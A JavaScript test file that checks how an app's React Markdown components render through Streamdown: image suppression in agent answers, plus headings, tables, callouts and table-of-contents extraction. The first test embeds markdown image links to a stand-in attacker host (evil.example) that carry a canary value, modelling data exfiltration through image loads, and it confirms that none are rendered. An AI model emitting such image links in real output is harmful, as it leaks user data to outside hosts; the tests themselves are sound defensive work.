import assert from "node:assert/strict"
import { mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join, resolve } from "node:path"
import test, { after } from "node:test"
import { fileURLToPath, pathToFileURL } from "node:url"
import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import TypeScript from "typescript"
import { imageAsText } from "./markdown-images.ts"
import { extractMarkdownToc, slugifyHeading } from "./markdown-render.ts"

const root = fileURLToPath(new URL("../", import.meta.url))
const fixture = mkdtempSync(join(tmpdir(), "doops-markdown-streamdown-test-"))
symlinkSync(join(root, "node_modules"), join(fixture, "node_modules"), "dir")
const compiled = new Map()
after(() => rmSync(fixture, { recursive: true, force: true }))

const compilerOptions = {
  module: TypeScript.ModuleKind.ESNext,
  target: TypeScript.ScriptTarget.ES2022,
  jsx: TypeScript.JsxEmit.ReactJSX,
}

function sourceModule(filename) {
  filename = resolve(filename)
  if (compiled.has(filename)) return compiled.get(filename)
  const output = join(fixture, `${compiled.size}.mjs`)
  const url = pathToFileURL(output).href
  compiled.set(filename, url)
  let javascript = TypeScript.transpile(readFileSync(filename, "utf8"), compilerOptions, filename)
  const parsed = TypeScript.createSourceFile(filename, javascript, TypeScript.ScriptTarget.ES2022, true, TypeScript.ScriptKind.JS)
  for (const statement of parsed.statements
    .filter((s) => (TypeScript.isImportDeclaration(s) || TypeScript.isExportDeclaration(s)) && s.moduleSpecifier)
    .reverse()) {
    const specifier = statement.moduleSpecifier
    const name = specifier.text
    if (!name.startsWith(".") && !name.startsWith("@/")) continue
    const source = name.startsWith("@/") ? join(root, name.slice(2)) : name
    const resolved = TypeScript.resolveModuleName(
      source,
      filename,
      {
        ...compilerOptions,
        moduleResolution: TypeScript.ModuleResolutionKind.Bundler,
        allowImportingTsExtensions: true,
      },
      TypeScript.sys,
    ).resolvedModule
    assert.ok(
      resolved && resolved.resolvedFileName.startsWith(root) && /\.tsx?$/.test(resolved.resolvedFileName),
      `Missing DoOps TypeScript source: ${name} from ${filename}`,
    )
    javascript =
      javascript.slice(0, specifier.getStart(parsed)) +
      JSON.stringify(sourceModule(resolved.resolvedFileName)) +
      javascript.slice(specifier.end)
  }
  writeFileSync(output, javascript)
  return url
}

const { AgentRunOutput } = await import(sourceModule(join(root, "components/agent-run-output.tsx")))
const { Markdown } = await import(sourceModule(join(root, "components/markdown.tsx")))
const { BlogMarkdown } = await import(sourceModule(join(root, "components/blog-markdown.tsx")))

const CANARY = "doops-synthetic-canary-r41-7f2e"

test("Given a DoSql or DoWeb answer with images, When AgentRunOutput renders via Streamdown, Then no <img> or preload is emitted", () => {
  const cases = [
    ["inline image", `结果如下 ![t](https://evil.example/p?d=${CANARY})`],
    ["reference image", `![x][r]\n\n[r]: https://evil.example/r?d=${CANARY}`],
    ["image in table", `| a |\n| --- |\n| ![t](https://evil.example/t?d=${CANARY}) |`],
    ["image inside link", `[![a](https://evil.example/i?d=${CANARY})](https://example.test)`],
  ]
  for (const [name, answer] of cases) {
    const html = renderToStaticMarkup(
      createElement(AgentRunOutput, { run: { notes: [], trace: "", answer }, running: false, empty: "" }),
    )
    assert.doesNotMatch(html, /<img\b/i, name)
    assert.doesNotMatch(html, /rel="preload"/i, name)
  }
  const labelled = renderToStaticMarkup(
    createElement(AgentRunOutput, {
      run: { notes: [], trace: "", answer: `![结果图](https://evil.example/p?d=${CANARY})` },
      running: false,
      empty: "",
    }),
  )
  assert.match(labelled, /图片：结果图，未加载 https:\/\/evil\.example\/p/)
  assert.match(renderToStaticMarkup(imageAsText({})), /\[图片，未加载\]/)
})

test("Given default Markdown (Knowledge Base), When an image is present, Then Streamdown renders <img>", () => {
  const html = renderToStaticMarkup(createElement(Markdown, { content: "![架构图](https://example.test/arch.png)" }))
  assert.match(html, /<img\b/)
})

test("Given Knowledge Base Markdown with callouts, tables, headings, code blocks, and math, When rendered, Then Streamdown structures them cleanly", () => {
  const doc = [
    "# 部署巡检手册",
    "## 部署巡检手册",
    "> [!WARNING] 生产变更门禁",
    "> 执行前请先核对备份状态。",
    "",
    "> [!NOTE] 默认使用当前目标命名空间。",
    "",
    "- [x] 核对镜像 digest",
    "- [ ] 观察 Pod Ready",
    "",
    "| 指标 | 当前值 | 状态 |",
    "|:---|---:|:---:|",
    "| CPU | 42% | 正常 |",
    "",
    "```sql",
    "SELECT count(*) FROM nodes;",
    "```",
  ].join("\n")

  const html = renderToStaticMarkup(createElement(Markdown, { content: doc, variant: "document" }))
  assert.match(html, /id="部署巡检手册"/)
  assert.match(html, /id="部署巡检手册-1"/)
  assert.match(html, /生产变更门禁/)
  assert.match(html, /执行前请先核对备份状态/)
  assert.match(html, /默认使用当前目标命名空间/)
  assert.doesNotMatch(html, /\[!WARNING\]/)
  assert.doesNotMatch(html, /\[!NOTE\]/)
  assert.match(html, /data-streamdown="table"/)
  assert.match(html, /data-streamdown="code-block"/)
  assert.match(html, /复制代码/)
})

test("Given extractMarkdownToc, When fenced code blocks contain # comments, Then only real headings are extracted", () => {
  const md = [
    "# 总体架构",
    "```bash",
    "# 这是一行注释，不是标题",
    "kubectl get nodes",
    "```",
    "## 数据库巡检",
    "### `pg_stat_activity` 指标",
  ].join("\n")
  const toc = extractMarkdownToc(md)
  assert.deepEqual(toc, [
    { id: "总体架构", text: "总体架构", level: 1 },
    { id: "数据库巡检", text: "数据库巡检", level: 2 },
    { id: "pg_stat_activity-指标", text: "pg_stat_activity 指标", level: 3 },
  ])
  const seen = new Map()
  assert.equal(slugifyHeading("Hello World!", seen), "hello-world")
})

test("Given BlogMarkdown with raw HTML header and callout, When rendered via Streamdown, Then HTML is skipped and callouts render", () => {
  const post = [
    '<p align="right"><a href="../en/post.md">English</a></p>',
    "",
    "## 一、核心架构",
    "> [!TIP]",
    "> 统一通过 Gateway 审计。",
  ].join("\n")
  const html = renderToStaticMarkup(createElement(BlogMarkdown, { content: post }))
  assert.doesNotMatch(html, /English/)
  assert.match(html, /id="一核心架构"/)
  assert.match(html, /建议/)
})
